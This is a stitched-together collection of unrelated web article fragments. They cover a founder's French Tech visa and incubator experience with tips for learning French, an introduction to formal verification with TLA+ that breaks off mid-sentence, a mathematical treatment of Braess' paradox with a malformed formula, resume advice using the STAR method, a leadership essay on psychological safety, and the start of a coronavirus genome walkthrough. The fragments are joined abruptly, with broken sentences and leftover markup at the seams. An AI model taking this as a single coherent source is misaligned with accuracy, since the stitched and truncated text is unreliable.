<figure><a href="https://lafrenchtech.com/en/how-france-helps-startups/french-tech-visa/visa-for-founders/" target="_blank" rel="noopener noreferrer"><img src="http://christianpetroske.com/wp-content/uploads/2020/08/image-1024x707.png" alt="" srcset="https://christianpetroske.com/wp-content/uploads/2020/08/image-1024x707.png 1024w, https://christianpetroske.com/wp-content/uploads/2020/08/image-300x207.png 300w, https://christianpetroske.com/wp-content/uploads/2020/08/image-768x530.png 768w, https://christianpetroske.com/wp-content/uploads/2020/08/image-1536x1061.png 1536w, https://christianpetroske.com/wp-content/uploads/2020/08/image-2048x1414.png 2048w, https://christianpetroske.com/wp-content/uploads/2020/08/image-1200x829.png 1200w, https://christianpetroske.com/wp-content/uploads/2020/08/image-1980x1367.png 1980w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure>



<p>These incubators are all partnered with the French government to support foreign founders. The kind of support varies, but your goal is to find one that can offer you the visa.</p>



<p>One week, I decided I would do this. So I came up with a startup idea, made a pitch deck, website, and email address, and started sending emails. I reached out to probably 30 of these and had conversations with about 10 until it got down to 2-3 that seemed promising. </p>



<p>I just found the deck I made in Canva. It was an employee engagement app called Purpose, Go! (I know right?).</p>



<figure><img src="http://christianpetroske.com/wp-content/uploads/2020/08/image-2-1024x768.png" alt="" srcset="https://christianpetroske.com/wp-content/uploads/2020/08/image-2-1024x768.png 1024w, https://christianpetroske.com/wp-content/uploads/2020/08/image-2-300x225.png 300w, https://christianpetroske.com/wp-content/uploads/2020/08/image-2-768x576.png 768w, https://christianpetroske.com/wp-content/uploads/2020/08/image-2-1536x1152.png 1536w, https://christianpetroske.com/wp-content/uploads/2020/08/image-2-1200x900.png 1200w, https://christianpetroske.com/wp-content/uploads/2020/08/image-2.png 1754w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Lol ok, not bad. How an app was supposed to accomplish that, lord knows.</figcaption></figure>



<p>I ended up on the phone with <a rel="noreferrer noopener" href="https://theschoolab.com/en/" target="_blank">Schoolab</a> in Paris, who said they liked my idea and told me to come in to meet the team. I met them, did a tour, and got offered a spot. It cost me €650 a month for their 6 month program, including the visa, access to the community of startups and mentors, and office space. I took the deal.</p>



<p>Fees vary by incubator, but overall you’ll need around €5,000 in the bank to pay for the incubator program plus taxes and fees in the application process.</p>



<p>Then, you’ll need to prove that you have money equal to the French minimum wage (€18,254.60 in 2019). I didn’t have this. Instead, you can find someone who does have this kind of money to be your “guarantor”. The visa office will accept it as long as that person signs a letter saying they will support you if needed while you’re in France.</p>



<p>Once you get into the incubator, they will help you apply to get your three-page business proposal approved by the relevant government agency. They even helped me translate mine into French. It takes a couple of months, but once you have that approval letter, you are on the fast track for a four year visa.</p>



<p>There are differences by country, but being a US citizen, I had to go back to my home consulate in New York to complete the visa process.</p>



<p>I arrived in France in August, started the incubator in September, and didn’t get my provisional visa until February… So that gives you an idea. </p>



<h2>Second: the business</h2>



<p>Once I was in the incubator, the next challenge arose: What the hell was I going to do with this business?</p>



<p>For about two solid months I worked on Purpose, Go! alongside various client projects to keep some money coming in. I networked hard in the HR tech world in Paris and got to know some interesting people. But it became clear that these relationships were not going anywhere—and without relationships, I had no hope of selling into businesses.</p>



<p>So I started spending more time with a friend I’d made in the program, <a rel="noreferrer noopener" href="https://plentyworks.io/outer-space-mindset/" target="_blank">Buddhika</a>, who was working on a VR fitness company. When it became clear my thing wasn’t going to work (and they were struggling a bit too), we started talking in earnest about partnering up. Becoming co-founders.</p>



<p>So I started to work with them on the VR fitness idea. It was clear it was going to take a while to mature into something that could make money, so we looked around for income sources. One of our friends in the program needed an app built, so we decided to go into software development. That’s what led to our real French company.</p>



<p>We started out as individual micro-entrepreneurs, since it’s super easy to get started and get paid legally through that status. Eventually, we opened up a SAS entity in what seemed like an extremely painful and expensive process. It didn’t need to be.</p>



<p>The perfect time to start a SAS (the equivalent of a US Corporation) is when you’re building something you want to raise money for at some point. We wanted to keep our options open, so we did that. </p>



<p>Many small businesses start as SARL entities (rough equivalent of a US LLC) instead, since taxes are lower but fundraising ability is null.</p>



<p>Whatever you choose, the most important (and most difficult) thing is to find a way to actually get paid in the first place. French business is highly networked, even more so than the US, which means that people like to only do business with people they have a relationship with. So investing in building relationships is the number one most important thing you can do for the success of your French business.</p>



<p>Speaking of which…</p>



<h2>Third: the language</h2>



<p>To build relationships with people, you will need some level of French. It’s certainly possible to only run in circles where you can speak English, don’t get me wrong. But you will miss opportunities if you’re constrained by language.</p>



<p>One of the first places you may run into this problem is when looking for an incubator. Schoolab, for instance, has since shrunk or canceled their English-language programming since I was there because it was too difficult to maintain programs in two languages (and they couldn’t get everyone to switch over to English). </p>



<p>So how do you learn French quickly, cheaply, and effectively?</p>



<p>This is exactly what I tried to do, being hyper-conscious that my runway was dwindling with each passing month. Here was my rough language-learning regimen that got me conversational in about 6 months:</p>



<ul><li>Start out with cheap private lessons through iTalki. You can spend $10-15 an hour for a junior teacher to talk with you and teach you core grammar principles and vocab.</li><li>Listen to French podcasts constantly. This is key to improving comprehension. Read the transcript along if you can. My favorites at the beginning were <a rel="noreferrer noopener" href="https://savoirs.rfi.fr/fr/apprendre-enseigner/langue-fran%C3%A7aise/journal-en-fran%C3%A7ais-facile" target="_blank">Le Journal en Français Facile from RFI</a>, <a rel="noreferrer noopener" href="https://podcasts.apple.com/gb/podcast/learn-french-by-podcast/id160256534" target="_blank">Learn French by Podcast</a>, and <a rel="noreferrer noopener" href="https://podcasts.apple.com/gb/podcast/coffee-break-french/id263170419" target="_blank">Coffee Break French</a>. Now I love <a rel="noreferrer noopener" href="https://www.lesechos.fr/podcasts/la-story" target="_blank">La Story by Les Echos</a>, <a rel="noreferrer noopener" href="https://www.binge.audio/podcast/a-bientot-de-te-revoir/" target="_blank">A bientôt de te revoir</a>, and many more.</li><li>Read French news and blogs. Focus on what you’re interested in. I’m interested in technology and startups so I would read <a rel="noreferrer noopener" href="https://www.maddyness.com/" target="_blank">Maddyness</a>.</li><li>Get grammar lessons from YouTube. My hands-down favorite here is <a rel="noreferrer noopener" href="https://learnfrenchwithalexa.com/" target="_blank">Learn French with Alexa</a>. She explains even the advanced concepts so clearly.</li><li>And of course, take every opportunity to talk to real people! Having friends who are willing to suffer through your awful French (and laugh at you a bit, yes) is one of the things that will accelerate your learning the most. Go to events you find on Facebook. Take a dance class. Get out there. The more uncomfortable you are with your language ability, the more motivated you will be to learn faster.</li></ul>



<p>There’s also the culture to get used to, but maybe we’ll save that one for another post. </p>



<p>It’s wild that I’m coming up on three years in France. It has been an adventure. Hopefully some of this will help others navigating this for the first time. </p>

<p>When engineers were designing completely autonomously operated
<a href="https://en.wikipedia.org/wiki/Paris_M%C3%A9tro_Line_14">Paris Métro line 14</a>,
they
had to ensure the safety of tens of millions passengers each year, its 22 stations across Paris as
well as smooth running of trains. How to approach the development of software that allows for
the automation of public transit? The French team decided to use formal verification – learn
what it means!</p>

<p>We will go through an introduction to formally verified software,
note when formal verification gives most returns and present two introductory examples.
The first example will present a turnstile logic with a flip coin and the other one will be
a real, but still basic example of TLA+ methodology on the Die Hard with a Vengeance
problem with two jugs.</p>

<p>After reading the article you will gain an overview on fundamentals of Formally Verified
Software and will be aware of the method to avoid software bugs which can cause your business to
<a href="https://www.theregister.com/2020/08/13/yam_cryptocurrency_bug_governance/">implode</a>.</p>

<h2 id="why-do-systems-need-formal-verification">Why do systems need Formal Verification?</h2>

<p>In engineering we have methods to validate
(i.e. “Are we trying to make the product meet the user’s requirements?”)
and
verify (i.e. “Does the product conform to the validated specification?”).
In the realm of computer hardware Formal
Verification is a pretty old concept and has been in existence since 1984 with
tools like <a href="https://en.wikipedia.org/wiki/Verilog">Verilog</a> and now superseded
by tools like <a href="https://en.wikipedia.org/wiki/SystemVerilog">SystemVerilog</a>.
Such tools have become part of the IEEE specifications for designing and
verifying hardware.</p>

<p>However, in the realm of software engineering even though we have had
verification tools that have
<a href="https://en.wikipedia.org/wiki/List_of_model_checking_tools">existed</a> since late the
1980s, it still has not been standardized nor is in widespread use in comparison to its
hardware counterpart. Even when we see the use of Formal Verification, we can see
that it is usually limited to specific fields like cryptography or communication
protocols and is frequently done by the academic circles. A good example of
implementing formal methods of verification is the automation of <a href="https://en.wikipedia.org/wiki/Paris_M%C3%A9tro_Line_14">Paris Métro
line 14</a>.  With the ever
increasing complexity of software and the layers of abstraction, we have reached
a time when writing secure, efficient and resilient code requires some level of
formal verification to be done, if not for the whole software at least for the
important sub-systems involved. In recent times we have seen more
<a href="https://lamport.azurewebsites.net/tla/industrial-use.html">widespread adoption</a>
of formal verification by the industry leaders
like Intel, Amazon or Microsoft, in products where we
have enormous complexity and multiple systems interacting with one another.</p>

<h2 id="what-do-we-formally-verify">What do we formally verify?</h2>

<p>In the realm of software engineering, the first step of formal verification is asking the following questions:</p>

<ul>
<li>What do we intend to verify?</li>
<li>How do we verify?</li>
</ul>

<h3 id="what-do-we-intend-to-verify">What do we intend to verify?</h3>

<p>Setting out to verify the whole system and every line of written code, even though
theoretically possible, is a beginner’s mistake. The art of engineering is about being
smart enough to know which corners to cut and which ones not to cut. This is not
an easy task - it takes time, practice and experience to take decisions on
this. We should also keep in mind writing “verification” for a system is not the
same as writing tests (Unit / Functional) and fuzzing for it. Writing tests and
achieving 100% code coverage does not guarantee that the system works as
intended and it is only as good as tests themselves (after all, who tests the
unit tests?). Verification and testing can be considered to be two sides of the
same coin and one complements the other, completing the picture.</p>

<p>Formal verification involves writing proofs on an abstract “mathematical model”
of the system. Depending on the design of the system, there are various options
available which can be used as the basis for writing the proof of
verification. Let us take the case of <a href="https://tamarin-prover.github.io/">Tamarin
Prover</a> – the tool used for symbolic
modeling and analysis of security protocols. Here abstractions happen at the
protocol level and agents that interact with the protocol. This abstraction works
well for security and cryptography related code. Our approach discussed in this
article would be a more fine grained approach, trying to verify finite state
machines and this is called <a href="https://en.wikipedia.org/wiki/Model_checking">model
checking</a>.</p>

<h3 id="how-do-we-verify">How do we verify?</h3>

<p>Finite state machines are the simplest mathematical models of computation where
we represent states and the rules to transition from one state to another.
As an illustrative example let us take a closer look into the
working of a coin operated
<a href="https://en.wikipedia.org/wiki/Finite-state_machine#Example:_coin-operated_turnstile">turnstile</a>.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/turnstile.png" alt="Turnstile">

<em>Turnstiles Revolution</em>

<ul>
<li>We have a coin operated turnstile which is either in a “closed” state or “open” state.</li>
<li>We have a couple of operations that we can do on such a turnstile

<ul>
<li>We can “push” it.</li>
<li>We can “insert coin” into it.</li>
</ul></li>
<li>Applying the operations on a given state allows you transition between states
or keeps you in the same state depending on which operation is applied to
which state.</li>
</ul>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/Turnstile_state_machine_colored.png" alt="The state diagram of a turnstile"></p>

<p>The above description can be represented as a diagram and this basically
constitutes the representation of a finite state machine.</p>

<p>Our aim is to verify that given this state machine, the turnstile works as
expected and more importantly, it does not enter an unexpected state. For example,
we do not want the turnstile to go “unlocked” without a coin or remain
“unlocked” after a push has been made.</p>

<p>A very simple way of thinking about this is to consider the state machine in a
linear timeline and the actions and transitions in this linear timeline.</p>

<p>Our reasoning on the working of the machine and the states it takes up is not
absolute :</p>

<ul>
<li>The turnstile is not guaranteed to be “open” at all points in time (or
“closed” for that matter)</li>
<li>The statement “The turnstile is open” has truth values that would vary with
time</li>
</ul>

<p>All this forms the basis of <a href="https://en.wikipedia.org/wiki/Temporal_logic">temporal
logic</a>.</p>

<p><strong><em>NOTE</em></strong>: <em>One of the basic things to keep at the back of the
mind would be that time continues to move forward in this universe even if no
further changes occur in the state machine.</em></p>

<p>So by verifying the behavior of the state machine through time one can in turn
verify the behavior of the system and its implementation. Of course things do
get complicated when these state machines are distributed over a network and
things happen in a concurrent system.</p>

</p><center><small><small>

<p>Let’s take a look at a very specific tool called
<a href="https://en.wikipedia.org/wiki/TLA%2B">TLA+</a>, which can be used to achieve state
machine verification for concurrent systems.</p>

<h3 id="why-tla">Why TLA+?</h3>

<p>TLA+ has been around since 1999, and is developed by <a href="https://en.wikipedia.org/wiki/Leslie_Lamport">Leslie
Lamport</a>, a Turing award winner.
In addition to writing
formal specification, it can also be used to design, model, document and verify
programs, especially concurrent systems and distributed systems. This is a good
toolkit to have since many of the systems level applications and blockchain
applications tend to have a combination of distributed and concurrent systems
at play.</p>

<p>TLA+ has been used to write up systems level proofs for things like Memory
<a href="https://en.wikipedia.org/wiki/Cache_coherence">Cache coherence</a> protocols to
distributed consensus protocols like
<a href="https://en.wikipedia.org/wiki/Raft_(computer_science)">Raft</a>. In addition to
this, TLA+ specification is also LaTeX compatible making for an excellent way to
generate documentation of the proofs.</p>

<h2 id="a-simple-tla-example">A simple TLA+ example</h2>

<p>Unfortunately, TLA+ does not come with a run off the mill “Hello, World”, like
most other programming languages. And we have to take a slightly bigger example
to understand the basics of TLA+. We shall choose one of the basic introductory
examples given in the TLA+ tutorials called <a href="https://lamport.azurewebsites.net/video/video4-script.pdf">Die
Hard</a> problem.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/die_hard_jugs.png" alt="Die Hard with a Vengeance, Jugs problem"></p>

<p>The name of the problem comes from the movie “Die Hard with a Vengeance”, where
the two heroes of the movie have to stop a bomb from exploding by placing 4
gallons of water in a jug. The twist being that the heroes are provided only with a
3-gallon jug, 5-gallon jug and a water faucet.</p>

<p>We solve this problem by starting to fill 5-gallon jug. This is the
approach taken in the movie.</p>

<ul>
<li>Make sure both the jugs are empty at the start.</li>
<li>Fill the 5-gallon jug.</li>
<li>Empty the 5-gallon jug into the 3-gallon jug.</li>
<li>We have 2 gallons of space in the 5-gallon jug.</li>
<li>Empty 3-gallon jug on to the ground.</li>
<li>Pour the remaining 2 gallons in the 5-gallon jug into the 3-gallon jug. (1
gallon space remaining in 3-gallon jug)</li>
<li>Fill the 5-gallon jug.</li>
<li>Pour 1 gallon out from the 5-gallon jug into the remaining space in the
3-gallon jug.</li>
</ul>

<p>By the end of this manual process we should have exactly 4 gallons of water in
the 5-gallon jug.</p>

<p><em>There is an alternative solution to this problem, by starting to fill the 3-gallon jug.
If can find it out, leave your solution in a comment.</em></p>

<p>The manual description of the solution happens in discrete steps, like following

the next state.</p>

<p>Now we are going to take a look at the solution from a TLA+ perspective.</p>

<p>We are not going to do any fancy stuff with TLA+ for now. But we will be
exploring the basic features of TLA+ and how it works, namely making it step
through a Finite state machine.</p>

<p><strong><em>NOTE:</em></strong>:<em>TLA+ uses a <a href="https://en.wikipedia.org/wiki/Breadth-first_search">breadth-first search</a>
approach when going through a state machine</em></p>

<p>Let us have a look at the TLA+ description of the <a href="https://github.com/jameshfisher/tlaplus/blob/master/examples/DieHard/DieHard.tla">Die

</p>




<p>Consider the following scenario. A large number of independent agents wish to traverse a network, from some start vertex to some end vertex. Each edge they travel will take some time, which could in general depend on the number of agents traveling along the edge. For the sake of simplicity, we’ll normalize things so that <span>\(x\)</span> denotes a proportion of agents (i.e. <span>\(x\)</span> ranges from 0 to 1). In what follows, we will let <span>\(\mathcal{E}\)</span> denote the set of edges, and <span>\(c_e :
[0,1] \to \mathbb{R}\)</span> the <em>cost</em> function associated with edge <span>\(e\)</span>. A very simple example is something like the following, where <span>\(s\)</span> is the start and <span>\(d\)</span> is the destination, and edges have been labeled with their cost.</p>
<div>
<p><img src="http://cadlag.org/ancillary/braess/initial.png" alt="A simple routing network, with variable edge cost."></p><p>A simple routing network, with variable edge cost.</p>
</div>
<p>One way to summarize the entire set of paths chosen is via a <em>flow</em> <span>\(f\)</span>, which assigns to each edge the normalized proportion of agents who have chosen to travel along it. For example, if all agents chose the top route in the above network, then we would have <span>\(f_{su} = 1, f_{ud} = 1\)</span> and <span>\(f_{sv} = 0, f_{vd} =
0\)</span>. There are of course other possible flows; one could consider the flow that puts all agents along the bottom path, or another which mixes the top and bottom paths somehow. <a href="#fn1" id="fnref1"><sup>1</sup></a></p>
<p>For a general flow <span>\(f\)</span>, the <em>total cost</em> borne by the agents in navigating the network is</p>
<p><span>\[
C(f) = \sum_{e \in E} f_e c_e(f_e).
\]</span></p>
<p>In the above example, routing all traffic along the top path (or equivalently, the bottom path) has a total cost of <span>\(2\)</span>. However, if one split the traffic so that half travels along the top path and half along the bottom path, then the total cost is only <span>\(0.5 c_{su}(0.5) + 0.5 \cdot c_{ud} + 0.5 \cdot c_{sv}(0.5) +
0.5 \cdot_{vd}(0.5) = 1.5\)</span>. In this example, this turns out that this is the minimum cost flow. One could imagine that if we were benevolent dictators controlling the choices of the agents, we might opt for this as an outcome.</p>

<p>Another way of looking at this routing problem is from the agent’s point of view. Suppose that, for each path <span>\(P\)</span>, some proportion of agents choose <span>\(P\)</span> for their traversal. In other words, we may imagine that we have a distribution <span>\(g\)</span> with <span>\(g_P \geq 0\)</span> and <span>\(\sum_{P \in \mathcal{P}} g_P = 1\)</span>, where <span>\(\mathcal{P}\)</span> denotes the set of <span>\(s-d\)</span> paths through the network. Thus <span>\(g_P\)</span> is the proportion of agents choosing path <span>\(P\)</span>. We’ll call such a <span>\(g\)</span> a <em>path distribution</em>, for lack of a better name.</p>
<p>There’s nothing lost by thinking about path distributions rather than flows. Indeed, given a path distribution <span>\(g\)</span> we can recover a flow by letting <span>\(f_e =
\sum_{P : e \in P} g_P\)</span>, where the sum is over all paths containing the edge <span>\(e\)</span>. It’s not hard to show that this is an honest flow.<a href="#fn2" id="fnref2"><sup>2</sup></a></p>
<p>So, from this vantage point: which path would an agent like to pick? In general, the cost of an edge depends on hhow much traffic it gets, so the answer is really contingent on the paths chosen by the other agents.</p>
<p>To give some clarity around this, let’s introduce an assumption about behavior: an agent will choose a path only if there are no cheaper alternatives. This is both a weak assumption, in the sense that it’s hard to argue with the rationale, and a strong one, in the sense that we’re granting each agent quite a lot of information about the problem at hand (e.g. the network topology, the behavior of the other agents, and so on).</p>
<p>With this in mind, note that relative to a fixed flow <span>\(f\)</span>, the cost of a path <span>\(P\)</span> is</p>
<p><span>\[ C(P; f) = \sum_{e \in P} c_e(f_e). \]</span></p>
<p>Formally, a path distribution <span>\(g\)</span> is said to be a (pure Nash) <em>equilibrium</em> distribution if</p>
<p><span>\[ g_P &gt; 0 \text{ only if } P \text{ minimizes } C(P; f), \]</span></p>
<p>where <span>\(f\)</span> is the flow associated with <span>\(g\)</span>.</p>
<p>In other words, in an equilibrium distribution every agent takes a path that is minimal <em>with respect to the flow induced by the others</em>.</p>
<p>It’s worth mulling this over a bit. With an equilibrium distribution, there’s no incentive for any particular agent to switch paths. Each agent sees the social world around it as essentially fixed; the others have induced some flow <span>\(f\)</span>, and the best one can do is pick the path that’s cheapest relative to this.</p>
<p>In our simple network, there is only one equilibrium distribution: half of the agents take the top path, and half take the bottom. The cost of this equilibrium distribution is <span>\(1.5\)</span>, just as before.</p>

<p>To briefly recap, we’ve singled out two sorts of flows as being special.</p>
<ul>
<li>Cost-minimizing flows are the ones that we’d pick if were playing the part of a benevolent dictator.</li>
<li>Equilibrium flows (i.e. those induced by an equilibrium path distribution) are the ones that we can imagine a bunch of independent agents settling for.</li>
</ul>
<p>It was something of a coincidence that in our toy network these two ended up being the same. But they don’t have to be.</p>
<p>So what happens if we start adding edges to the network? Naively, it seems like it can only make things better. Certainly, adding an edge doesn’t increase the cost of any previous flows (since they simply do not use the new edge), and in fact it’s possible that it makes available a new, cheaper flow. So as benevolent dictators, there’s not much to lose.</p>
<p>But what happens when we think from the agent’s perspective? Surprisingly enough, adding an edge can shift the equilibrium flow to something even costlier! For an extreme example, consider adding a free edge to our previous network.</p>
<div>
<p><img src="http://cadlag.org/ancillary/braess/augmented.png" alt="A network augmented with a zero cost edge."></p><p>A network augmented with a zero cost edge.</p>
</div>
<p>With this addition, the equilibrium distribution <a href="#fn3" id="fnref3"><sup>3</sup></a> puts all of the agents on the path <span>\(suvd\)</span>, for a total cost of 2! This is <a href="https://en.wikipedia.org/wiki/Braess%27s_paradox">Braess’ paradox</a>: adding capacity to a network can actually increase the cost of an equilibrium flow.</p>
<div>
<p><img src="http://cadlag.org/ancillary/braess/equilibrium.png" alt="The new equilibrium flow."></p><p>The new equilibrium flow.</p>
</div>
<p>I’m not going to prove that this flow is equilibrium, but let me give a glimpse of the incentives: the previous distribution, which put half of the agents on the top half and half of the agents on the bottom, is now unappealing from a traveller’s vantage point: relative to that flow, the effect of an agent on <span>\(sud\)</span> switching to <span>\(suvd\)</span> is to reduce their path cost by <span>\(0.5\)</span>. And so on.</p>

<p>By definition, an equilibrium flow is at least as costly as a cost-minimizing flow. The ratio</p>
<p><span>\[ \frac{\text{maximum cost of an equilibrium flow}}{\text{cost of min cost flow}} \]</span></p>
<p>is sometimes referred to as the <a href="https://en.wikipedia.org/wiki/Price_of_anarchy">Price of Anarchy</a>. For our original network, it was <span>\(1\)</span>. After adding the edge, it was <span>\(4/3\)</span>.</p>

Bring STAR power to all of your experience.</p><hr><div data-id="5zs6GBiB0EZyIKFI6dBB9e"><picture loading="lazy"><source srcset="https://images.ctfassets.net/f1aa79r6xovt/5zs6GBiB0EZyIKFI6dBB9e/c3ffeb191de1bca6fc0bf182af107c82/image.png?fm=webp&amp;w=700" type="image/webp"><img src="https://images.ctfassets.net/f1aa79r6xovt/5zs6GBiB0EZyIKFI6dBB9e/c3ffeb191de1bca6fc0bf182af107c82/image.png?fm=jpg&amp;w=700" alt="Word tiles spelling &quot;Choose your Words&quot;"></picture></div><h3></h3><h4></h4><p>When you're writing your resume, you will want to use the keywords that appear in the job description. So for example, if you are applying for a "Software Engineer" position, you will want to say that somewhere in your resume. On the other hand, if the position is titled "Web Application Developer," then you will want to incorporate that as well.</p><h4></h4><p>So from our example above, "Developed a single-page application," we will also want to expand on the word "developed." Here are some other words that you will want to capture in your descriptions to broaden the appeal:</p><ul><li>Implemented</li><li>Architected</li><li>Engineered</li><li>... and so on!</li></ul><p>Using synonyms in addition to the keywords will allow your resume to match as many job descriptions as possible.</p><h4></h4><p>A description that is too vague or too short can come across as uninspiring. When in doubt, use the STAR method. A resume doesn't need to be ten pages long, however, it does need to be long enough to evoke curiosity.</p><p>If your resume is shorter than a page, you will want to create more experience before you start sending that resume out. </p><h4></h4><p>Similar to the point above, a resume is meant to be used to match against a job description and fulfill a recruiter's requirements. From there, the purpose of a resume is to inspire and evoke curiosity from a hiring manager and the interview panel. </p><p><b>One Page</b> is the optimal length for a resume. You only need to highlight the last few positions that are relevant. Even if you have decades of experience, your resume needs to be compelling enough to leave an impression <b>within ten seconds. </b>When you're at the top of the funnel, that is about how long someone will glance at your resume before moving on to the next one.</p><p>A description that is loaded with responsibility and impact, or runs on more than a sentence or two - can actually have the reverse effect! Too much of a description can come across as appearing to know too little or give the impression of overselling.</p><p><b>Here's an example:</b></p><blockquote>Designed a webpage using Photoshop, creating multiple layers and exporting them via a PNG. Collaborated with engineering to deliver the PNG in a ZIP file. Planned and coordinated the delivery before the agreed upon timelines. Communicated with the team to revise the delivery throughout the project. </blockquote><p>A statement like this can undervalue your position. Why this happens is because when we look back at the STAR method - this description is mostly a given. It is expected that a designer would perform these tasks, and it doesn't add much value to those expectations.</p><p><b>Let's look at that, with a little more STAR power:</b></p><blockquote>Designed a webpage in collaboration with engineering, working cross-functionally with the project team to deliver ahead-of-time. This resulted in us reaching the market before our competition.</blockquote><p>Now that's a star! The difference here is how much value the designer brought to the role, exceeding the expectations.</p><h4></h4><p>Many of the resumes that get filtered out at the top of the funnel will have a giant cloud of keywords that are meant to fool the ATS robots. This is called <i><b>keyword stuffing</b></i>. What happens is that an innocent software engineer will create a skills list that they used at a position, and the robot will interpret this as keyword stuffing.</p><blockquote>Skills: React, Photoshop, Microsoft Word</blockquote><p>What you want to do instead is take the most important skills that are relevant to the hiring position, and express those at bullet points in your resume items.</p><blockquote>Developed a React web application to display order inventory.</blockquote><blockquote>Optimized web assets using Photoshop to reduce application size.</blockquote><blockquote>Collaborated on project specifications using Microsoft Word.</blockquote><p>In some cases, a particular skill can be so ubiquitous to the role that <a href="#leave-some-to-the-imagination">it's not worth including at all</a>. If the skill is very common, it is only worth mentioning if it added value or made an impact on the result.</p><h2></h2><p>You've written your resume, formatted it to be ATS-ready, and demonstrated your STAR power. Now it's time to submit your resume, right?</p><p>Before you submit your resume, do one final check. Find the job description and compare it with your resume. You should have included similar keywords such as:</p><ol><li>The Job Title</li><li>Situation and Action Words from the hiring position</li><li>Keywords from the hiring description</li></ol><p>Once you've done that, review your resume and submit it! You've done everything right, and your resume is ready to go.</p><hr><p>If you found these tips helpful, or you have some advice you would like to add - you can <a rel="nofollow noreferrer" target="_blank" href="https://twitter.com/coleturner">reach out to me on Twitter (@coleturner).</a></p><p>Photos by: <a rel="nofollow noreferrer" target="_blank" href="https://unsplash.com/@markuswinkler">Markus Winkler</a>, <a rel="nofollow noreferrer" target="_blank" href="https://unsplash.com/@gatismurnieks">Gatis Murnieks</a>, <a rel="nofollow noreferrer" target="_blank" href="https://unsplash.com/@brett_jordan">Brett Jordan</a></p></div></div></div>]]>

        <section>

            <p>Most people leave their job because of <a href="https://www.forbes.com/sites/victorlipman/2015/08/04/people-leave-managers-not-companies/#1000172847a9">their manager</a>. They leave their manager because they are not engaged in their work. So how do you, as a leader, engage your employees?</p>

<p>You might think it is giving them interesting work. You might think it is giving them lots of money and paying at the top of the industry. You might also think it is free lunch, free massages, and other cool perks you saw some Silicon Valley company offering their employees.</p>

<p>You’d be wrong.</p>

<p><strong>The single best way to engage your employees is to give them an environment of trust.</strong> This means trusting them from day one, allowing them to be transparent with you, and enabling them to spread that culture to their peers.</p>

<p>Another way of saying this: provide psychological safety. And here’s how you start doing it today.</p>

<h2 id="inclusion">Inclusion</h2>

<p>The vital first step is to make everyone a part of the conversation. It doesn’t matter if you are the first engineering hire or your first day on the job. Every person needs equal <em>and equitable</em> footing to speak and share their ideas.</p>

<p>Remote employees tend to get marginalized in this step. You might think you’re giving everyone a voice but if you have a headquarters where everyone gathers by a water cooler to talk shop then you are leaving your remote employees out of the conversation.</p>

<p>Junior, less experienced employees are often thought to be included because you might go around the table to ask for people’s opinions but they are still neglected because they aren’t taken as seriously or with equal gravity to their more senior counterparts. And while there is something to be said for experience driving more sound decisions that shouldn’t exclude a great idea simply because someone is brand new to the industry.</p>

<p>Give everyone a voice and make them equally as loud.</p>

<h2 id="safety-to-learn-and-contribute">Safety to learn and contribute</h2>

<p>Google made a huge stir about 20% time; that you could take a whole day out of your week to do whatever you want to develop your career outside of your regular value-added work to the company.</p>

<p>Since when is software engineering a career where you only need to learn 20% of the time? <strong>Learning should be an integral, continuous part of the software engineer’s professional experience</strong>. And the biggest part of learning is trying new things, not getting them right the first time, and persevering to get back up and try again.</p>

<p>I just watched a great <a href="https://www.youtube.com/watch?v=9vJRopau0g0">TED talk</a> on how just giving children encouragement towards their goals gave them a <em>16% increase in their chance of success</em>. How much would you pay for 16% fewer bugs, 16% more output, and 16% more engagement from your employees? Well mail me your checks because you can do it all for free if you simply encourage a culture that <strong>failure is a gift</strong> and not something to be reprimanded for.</p>

<p>We learn when we fail. We also learn when we share that failure (and subsequent success) with our teammates and greater community. Not only do we need a platform to try and fail, we also need a platform to share our findings along the way. Being able to contribute to the greater community is another vital point of psychological safety.</p>

<p>In my teams, <strong>we acknowledge that even updates to documentation are contributions</strong>. I’ve met plenty of high achievers who are annoyed that they can’t contribute to code on day one. I tell them that if the README is checked into the code base, and you find a flaw in our setup README docs, then that is checking in code. <strong>All contributions are welcome.</strong></p>

<p>When you know that your README change was as valuable to the team as some hardcore algorithmic update to some C++ code, you remove the barrier to entry that only the most senior folks can make the most outstanding contributions. <strong>Outstanding contributions come from outstanding people.</strong></p>

<h2 id="safety-to-challenge-the-status-quo">Safety to challenge the status quo</h2>

<p>No one wants to rock the boat on their first day at the job. That’s why new hires are the only ones wearing button down shirts with collars. Everyone <em>thinks</em> they have to dress to impress and start off on the right foot and by the end of the week these same engineers are wearing t-shirts like the rest of us.</p>

<p>What if, like me, they just liked getting dressed up because they enjoy dressing up? Or what if you didn’t think that having to be in the office was required for productivity in the first place?</p>

<p>Having radical ideas is the basis for innovation. If you couldn’t challenge societal norms then the founders of Airbnb would have never been able to convince people that it’s totally okay to sleep on a strangers couch and that everyone would be doing it a decade later. If you asked anyone in 2004 that premise would not only sound absurd but downright dangerous.</p>

<p>Why are only the successful entrepreneurs allowed to innovate? Why can’t it be every single person in your group? The only barrier to this hurdle is yourself. There is literally <em>nothing</em> stopping you from having anyone challenging the status quo. All you have to do is <em>let go</em>. Control is hard for some folks to relinquish but it is essential if you want to get this part of psychological safety.</p>

<h2 id="no-fear">No fear</h2>

<p>Which leads me to my last point: no fear. Letting go of control is based on a fear you have that if you don’t have control then bad things will happen. A fear-based mentality will only get you so far. It is self-limiting in nature.</p>

<p>A fear-based culture leads to people feeling:</p>

<ul>
  <li>embarrassed</li>
  <li>marginalized</li>
  <li>threatened</li>
  <li>punished</li>
</ul>

<p>A fearless culture, meanwhile, leads to people feeling:</p>

<ul>
  <li>celebrated</li>
  <li>included</li>
  <li>empowered</li>
  <li>rewarded</li>
</ul>

<p>Which feelings do you want to feel?</p>

<p>I hope I’ve convinced you that psychological safety is the bedrock for high-performing teams. A fearless culture leads to greater productivity, higher engagement, and increased satisfaction at work. And it costs you nothing but relinquishing a bit of your control freak instincts to trust your group to do the right thing.</p>

<p>If you can take that first fearless leap towards a safe environment then you will be rewarded with all of the benefits that come along with it.</p>

    <p>Hello and welcome to my Coronavirus Genome Walkthrough.</p>

<p>(Hoping someone comes out with that Vaccine Speedrun soon. This boss battle is really shaping up to be an intense one and we’ll need all the artifacts we can get.)</p>

